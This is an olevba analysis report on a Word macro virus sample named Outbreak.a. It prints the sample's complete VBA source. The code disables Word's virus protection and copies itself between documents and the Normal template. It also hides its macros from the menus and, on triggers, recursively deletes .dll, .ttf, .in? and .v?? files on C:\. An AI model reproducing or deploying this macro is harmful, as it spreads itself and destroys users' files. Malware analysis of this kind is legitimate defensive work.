olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Outbreak.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Outbreak.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO OutBreak.bas 
in file: Virus.MSWord.Outbreak.a - OLE stream: 'Macros/VBA/OutBreak'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "¥¨¶°«Ø¥ß©ó 98/??/??¡A«Ø¥ßªÌ OutBreak"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.OutBreak.AutoClose"
Dim TIMER
On Error Resume Next
Options.VirusProtection = False
Set activedoc = ActiveDocument
Set GlobalDoc = NormalTemplate
   

 Application.OrganizerCopy Source:=NormalTemplate.FullName, _
 Destination:=ActiveDocument.FullName, Name:="OutBreak", _
 Object:=wdOrganizerObjectProjectItems
 activedoc.SaveAs , fileformat:=wdFormatTemplate
 Options.SavePropertiesPrompt = False
   
   
 Application.OrganizerCopy Source:=ActiveDocument.FullName, _
 Destination:=NormalTemplate.FullName, Name:="OutBreak", _
 Object:=wdOrganizerObjectProjectItems
 Options.SaveNormalPrompt = False


TIMER = Int(Rnd() * 20) + 1
If TIMER = 13 Then
WordBasic.Call "MoTaBa"
WordBasic.Call "MoTaBa2"
End If
exit_:

End Sub
Sub AutoExec()
Dim A$
On Error Resume Next

Open "c:\command.log" For Input As 1
Input #1, A$
Close 1

If A$ = "OutBreak-J" Then
WordBasic.Call "MoTaBa1"
WordBasic.Call "MoTaBa3"
End If

If A$ = "" Then
Open "c:\command.log" For Output As 1
Print #1, "OutBreak-A"
Close 1
GoTo exit_
End If

If A$ = "OutBreak-A" Then
Open "c:\command.log" For Output As 1
Print #1, "OutBreak-B"
Close 1
GoTo exit_
End If

If A$ = "OutBreak-B" Then
Open "c:\command.log" For Output As 1
Print #1, "OutBreak-C"
Close 1
GoTo exit_
End If

If A$ = "OutBreak-C" Then
Open "c:\command.log" For Output As 1
Print #1, "OutBreak-D"
Close 1
GoTo exit_
End If

If A$ = "OutBreak-D" Then
Open "c:\command.log" For Output As 1
Print #1, "OutBreak-E"
Close 1
GoTo exit_
End If

If A$ = "OutBreak-E" Then
Open "c:\command.log" For Output As 1
Print #1, "OutBreak-F"
Close 1
GoTo exit_
End If

If A$ = "OutBreak-F" Then
Open "c:\command.log" For Output As 1
Print #1, "OutBreak-G"
Close 1
GoTo exit_
End If

If A$ = "OutBreak-G" Then
Open "c:\command.log" For Output As 1
Print #1, "OutBreak-H"
Close 1
GoTo exit_
End If

If A$ = "OutBreak-H" Then
Open "c:\command.log" For Output As 1
Print #1, "OutBreak-I"
Close 1
GoTo exit_
End If

If A$ = "OutBreak-I" Then
Open "c:\command.log" For Output As 1
Print #1, "OutBreak-J"
Close 1
GoTo exit_
End If

exit_:

End Sub
Sub AutoOpen()
On Error Resume Next
   
Options.VirusProtection = False
Set activedoc = ActiveDocument
Set GlobalDoc = NormalTemplate
   
  
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=ActiveDocument.FullName, Name:="OutBreak", _
Object:=wdOrganizerObjectProjectItems
activedoc.SaveAs , fileformat:=wdFormatTemplate
Options.SavePropertiesPrompt = False
   

    
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="OutBreak", _
Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False

exit_:
End Sub
Sub FileTemplates()
AutoExec
Rem OutBreak
End Sub
Sub ViewVBCode()
AutoExec
Rem OutBreak
End Sub
Sub ToolsCustomize()
Rem OutBreak
End Sub
Sub ToolsOptions()
Rem OutBreak
End Sub
Sub ToolsMacro()
AutoExec
Rem OutBreak
End Sub
Sub MoTaBa()
On Error Resume Next

 With Application.FileSearch
        .Filename = "*.in?"
        .LookIn = "C:\"
        .SearchSubFolders = True
        .Execute
        If .FoundFiles.count <> 0 Then
            For I = 1 To .FoundFiles.count
            Kill .FoundFiles(I)
            'Beep
            Next I
        End If
    End With

End Sub
Sub MoTaBa1()
On Error Resume Next

 With Application.FileSearch
        .Filename = "*.ttf"
        .LookIn = "C:\"
        .SearchSubFolders = True
        .Execute
        If .FoundFiles.count <> 0 Then
            For I = 1 To .FoundFiles.count
            Kill .FoundFiles(I)
            'Beep
            Next I
        End If
    End With
    
End Sub
Sub MoTaBa2()
On Error Resume Next

 With Application.FileSearch
        .Filename = "*.dll"
        .LookIn = "C:\"
        .SearchSubFolders = True
        .Execute
        If .FoundFiles.count <> 0 Then
            For I = 1 To .FoundFiles.count
            Kill .FoundFiles(I)
            'Beep
            Next I
        End If
    End With
    
End Sub
Sub MoTaBa3()
On Error Resume Next

 With Application.FileSearch
        .Filename = "*.v??"
        .LookIn = "C:\"
        .SearchSubFolders = True
        .Execute
        If .FoundFiles.count <> 0 Then
            For I = 1 To .FoundFiles.count
            Kill .FoundFiles(I)
            Beep
            Next I
        End If
    End With
    
End Sub
Sub FileSave()
On Error GoTo exit_:
WordBasic.FileSave
AutoClose
exit_:
End Sub
Sub FileSaveAs()
On Error GoTo exit_:
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
WordBasic.FileSaveAs dlg
AutoClose
exit_:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

